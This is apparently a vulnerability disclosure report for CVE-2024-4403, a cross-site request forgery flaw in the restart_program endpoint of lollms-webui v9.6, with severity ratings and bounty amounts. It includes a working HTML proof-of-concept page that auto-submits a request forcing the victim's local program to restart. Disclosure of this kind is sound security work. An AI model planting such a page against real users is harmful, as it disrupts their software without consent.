Title: CSRF in restart_program  in parisneo/lollms-webui

Proof of Concept: 
Step 1: The attacker sends fake files to the victim.

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost:9600/restart_program">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

Step 2: When users click, they will reset program without their knowledge .

Impact: 
Attackers trick users into performing actions they do not want

CVE ID: CVE-2024-4403
Status: (published)
Vulnerability Type: CWE-352: Cross-Site Request Forgery (CSRF)
Severity: Medium (4.4)
Attack Vector: Local
Attack Complexity: Low
Privileges Required: None
User Interaction: Required
Scope: Unchanged
Confidentiality: None
Integrity: Low
Availability: Low
Registry: Other
Affected Version: v9.6
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $75
Fix Bounty: $18.75
